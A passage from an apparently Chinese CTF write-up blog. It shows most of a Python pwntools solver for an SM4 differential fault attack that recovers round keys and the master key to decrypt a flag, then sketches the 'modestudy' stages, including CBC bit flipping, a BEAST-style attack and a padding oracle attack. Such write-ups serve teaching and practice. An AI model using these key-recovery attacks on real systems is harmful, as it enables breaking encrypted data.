</span></span><span class=line><span class=cl>    <span class=n>Y2</span> <span class=o>=</span> <span class=n>get_uint32_be</span><span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>Y3</span> <span class=o>=</span> <span class=n>get_uint32_be</span><span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>])</span>
</span></span><span class=line><span class=cl>         <span class=c1># X32, X33, X34, X35</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>Y3</span><span class=p>,</span>  <span class=n>Y2</span><span class=p>,</span>  <span class=n>Y1</span><span class=p>,</span>  <span class=n>Y0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_round</span><span class=p>(</span><span class=n>Xs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>Xs</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=n>Xs</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>Xs</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>Xs</span><span class=p>[</span><span class=mi>2</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_rk_byte</span><span class=p>(</span><span class=n>raw_cipher</span><span class=p>,</span> <span class=n>fault_ciphers</span><span class=p>,</span> <span class=n>j</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r_res</span><span class=p>,</span> <span class=n>r_X32</span><span class=p>,</span> <span class=n>r_X33</span><span class=p>,</span> <span class=n>r_X34</span> <span class=o>=</span> <span class=n>inv_round</span><span class=p>(</span><span class=n>raw_cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r_byte</span>   <span class=o>=</span> <span class=n>put_uint32_be</span><span class=p>(</span><span class=n>r_X32</span> <span class=o>^</span> <span class=n>r_X33</span> <span class=o>^</span> <span class=n>r_X34</span><span class=p>)[</span><span class=n>j</span><span class=o>%</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ios</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>f_cipher</span> <span class=ow>in</span> <span class=n>fault_ciphers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f_res</span><span class=p>,</span> <span class=n>f_X32</span><span class=p>,</span> <span class=n>f_X33</span><span class=p>,</span> <span class=n>f_X34</span> <span class=o>=</span> <span class=n>inv_round</span><span class=p>(</span><span class=n>f_cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>diff_out</span> <span class=o>=</span> <span class=n>ltor</span><span class=p>(</span><span class=n>put_uint32_be</span><span class=p>(</span><span class=n>r_res</span> <span class=o>^</span> <span class=n>f_res</span><span class=p>)[(</span><span class=n>j</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=mi>4</span><span class=p>],</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>f_byte</span> <span class=o>=</span> <span class=n>put_uint32_be</span><span class=p>(</span><span class=n>f_X32</span> <span class=o>^</span> <span class=n>f_X33</span> <span class=o>^</span> <span class=n>f_X34</span><span class=p>)[</span><span class=n>j</span><span class=o>%</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>ios</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>f_byte</span><span class=p>,</span><span class=n>diff_out</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(ios)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>candidate_keys</span> <span class=o>=</span> <span class=n>Counter</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>rk_byte</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>f_byte</span><span class=p>,</span> <span class=n>diff_out</span> <span class=ow>in</span> <span class=n>ios</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>r_byte</span><span class=o>^</span><span class=n>rk_byte</span><span class=p>]</span> <span class=o>^</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>f_byte</span><span class=o>^</span><span class=n>rk_byte</span><span class=p>]</span> <span class=o>==</span> <span class=n>diff_out</span><span class=p>:</span>
</span></span><span class=line><span class=cl>               <span class=n>candidate_keys</span><span class=p>[</span><span class=n>rk_byte</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>candidate_keys</span><span class=o>.</span><span class=n>most_common</span><span class=p>()[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_r_cipher</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your plaintext in hex:&#34;</span><span class=p>,</span> <span class=n>plaintext</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;hex:&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_f_cipher</span><span class=p>(</span><span class=nb>round</span><span class=p>,</span> <span class=n>j</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your plaintext in hex:&#34;</span><span class=p>,</span> <span class=n>plaintext</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;give me the value of r f p:&#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>round</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>random</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;hex:&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>f</span><span class=p>(</span><span class=n>x0</span><span class=p>,</span> <span class=n>x1</span><span class=p>,</span> <span class=n>x2</span><span class=p>,</span> <span class=n>x3</span><span class=p>,</span> <span class=n>rk</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#34;T algorithm&#34; == &#34;L algorithm&#34; + &#34;t algorithm&#34;.</span>
</span></span><span class=line><span class=cl>    <span class=c1># args:    [in] a: a is a 32 bits unsigned value;</span>
</span></span><span class=line><span class=cl>    <span class=c1># return: c: c is calculated with line algorithm &#34;L&#34; and nonline algorithm &#34;t&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_sm4_l_t</span><span class=p>(</span><span class=n>ka</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>put_uint32_be</span><span class=p>(</span><span class=n>ka</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>2</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>3</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>        <span class=n>bb</span> <span class=o>=</span> <span class=n>get_uint32_be</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=n>bb</span> <span class=o>^</span> <span class=p>(</span><span class=n>rotl</span><span class=p>(</span><span class=n>bb</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span> <span class=o>^</span> <span class=p>(</span><span class=n>rotl</span><span class=p>(</span><span class=n>bb</span><span class=p>,</span> <span class=mi>10</span><span class=p>))</span> <span class=o>^</span> <span class=p>(</span><span class=n>rotl</span><span class=p>(</span><span class=n>bb</span><span class=p>,</span> <span class=mi>18</span><span class=p>))</span> <span class=o>^</span> <span class=p>(</span><span class=n>rotl</span><span class=p>(</span><span class=n>bb</span><span class=p>,</span> <span class=mi>24</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>x0</span> <span class=o>^</span> <span class=n>_sm4_l_t</span><span class=p>(</span><span class=n>x1</span> <span class=o>^</span> <span class=n>x2</span> <span class=o>^</span> <span class=n>x3</span> <span class=o>^</span> <span class=n>rk</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_one_round</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>rk</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>f</span><span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>rk</span><span class=p>),</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>2</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_rounds</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>rks</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>rk</span> <span class=ow>in</span> <span class=n>rks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>decrypt_one_round</span><span class=p>(</span><span class=n>cipher</span><span class=p>,</span> <span class=n>rk</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>raw_cipher</span> <span class=o>=</span> <span class=n>inv_Y</span><span class=p>(</span><span class=n>get_r_cipher</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>raw_cipher</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rks</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=nb>round</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>31</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(round)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>rk</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>fault_ciphers</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>fault_ciphers</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>get_f_cipher</span><span class=p>(</span><span class=nb>round</span><span class=p>,</span> <span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>fault_ciphers</span> <span class=o>=</span> <span class=p>[</span><span class=n>inv_Y</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>fault_ciphers</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>fault_ciphers</span> <span class=o>=</span> <span class=p>[</span><span class=n>decrypt_rounds</span><span class=p>(</span><span class=n>f_cipher</span><span class=p>,</span> <span class=n>rks</span><span class=p>)</span> <span class=k>for</span> <span class=n>f_cipher</span> <span class=ow>in</span> <span class=n>fault_ciphers</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>rk_byte</span> <span class=o>=</span> <span class=n>get_rk_byte</span><span class=p>(</span><span class=n>raw_cipher</span><span class=p>,</span> <span class=n>fault_ciphers</span><span class=p>,</span> <span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>rk</span> <span class=o>=</span> <span class=p>(</span><span class=n>rk</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>rk_byte</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;round </span><span class=si>{</span><span class=nb>round</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2> subkey: </span><span class=si>{</span><span class=n>rk</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>rks</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>rk</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>raw_cipher</span> <span class=o>=</span> <span class=n>decrypt_one_round</span><span class=p>(</span><span class=n>raw_cipher</span><span class=p>,</span> <span class=n>rk</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>_round_key</span><span class=p>(</span><span class=n>ka</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>put_uint32_be</span><span class=p>(</span><span class=n>ka</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>2</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_BOXES_TABLE</span><span class=p>[</span><span class=n>a</span><span class=p>[</span><span class=mi>3</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>bb</span> <span class=o>=</span> <span class=n>get_uint32_be</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>rk</span> <span class=o>=</span> <span class=n>bb</span> <span class=o>^</span> <span class=p>(</span><span class=n>rotl</span><span class=p>(</span><span class=n>bb</span><span class=p>,</span> <span class=mi>13</span><span class=p>))</span> <span class=o>^</span> <span class=p>(</span><span class=n>rotl</span><span class=p>(</span><span class=n>bb</span><span class=p>,</span> <span class=mi>23</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>rk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># def set_key(key, mode):</span>
</span></span><span class=line><span class=cl>    <span class=c1># key = bytes_to_list(key)</span>
</span></span><span class=line><span class=cl>    <span class=c1># sk = []*32</span>
</span></span><span class=line><span class=cl>    <span class=c1># MK = [123, 456, 789, 145]</span>
</span></span><span class=line><span class=cl>    <span class=c1># k = [0]*36</span>
</span></span><span class=line><span class=cl>    <span class=c1># MK[0] = get_uint32_be(key[0:4])</span>
</span></span><span class=line><span class=cl>    <span class=c1># MK[1] = get_uint32_be(key[4:8])</span>
</span></span><span class=line><span class=cl>    <span class=c1># MK[2] = get_uint32_be(key[8:12])</span>
</span></span><span class=line><span class=cl>    <span class=c1># MK[3] = get_uint32_be(key[12:16])</span>
</span></span><span class=line><span class=cl>    <span class=c1># k[0:4] = xor(MK[0:4], SM4_FK[0:4])</span>
</span></span><span class=line><span class=cl>    <span class=c1># for i in range(32):</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     k[i + 4] = k[i] ^ (</span>
</span></span><span class=line><span class=cl>    <span class=c1>#         _round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]))</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     sk[i] = k[i + 4]</span>
</span></span><span class=line><span class=cl>    <span class=c1># return sk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_key_schedule</span><span class=p>(</span><span class=n>rks</span><span class=p>):</span> <span class=c1># rks: [rk32, rk31, rk30, rk29]</span>
</span></span><span class=line><span class=cl>    <span class=n>k</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>32</span> <span class=o>+</span> <span class=n>rks</span><span class=p>[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>31</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>4</span><span class=p>]</span> <span class=o>^</span> <span class=p>(</span><span class=n>_round_key</span><span class=p>(</span><span class=n>k</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>2</span><span class=p>]</span> <span class=o>^</span> <span class=n>k</span><span class=p>[</span><span class=n>i</span> <span class=o>+</span> <span class=mi>3</span><span class=p>]</span> <span class=o>^</span> <span class=n>SM4_CK</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>k</span><span class=p>[</span><span class=mi>4</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Mk</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>Mk</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>SM4_FK</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>^</span> <span class=n>k</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>master_key</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>master_key</span> <span class=o>+=</span> <span class=n>put_uint32_be</span><span class=p>(</span><span class=n>Mk</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>list_to_bytes</span><span class=p>(</span><span class=n>master_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Mk</span> <span class=o>=</span> <span class=n>inv_key_schedule</span><span class=p>(</span><span class=n>rks</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>Mk</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your key in hex:&#34;</span><span class=p>,</span> <span class=n>Mk</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your ciphertext in hex:&#34;</span><span class=p>,</span> <span class=n>enc_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your plaintext in hex:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>flag</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>但是能getflag：</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_80b51b89dfd332c4c8c86c69fe16698d.png alt></p><h3 id=modestudy>modestudy</h3><p>第一关 cbc bit flip，把第一块密文的最后一字节xor上0x1即可</p><p>第二关</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_7b66e6dda856cd1cf3f9c8ab71abcb68.png alt></p><p>扔给服务器两个一样的c1、c2，然后iv = (c1 ^ p2) ^ p1</p><p>第三关</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_159b1c4e457f109f16b6c8ba0e45486b.png alt></p><p>把第3块密文换成第5块密文</p><p>第四关 低配版 BEAST Attack</p><p>第五关 几次尝试后，发现它的加密实际上就是对每2byte进行置换，列一个置换表出来，即可找到secret</p><p>第六关 padding oracle attack</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
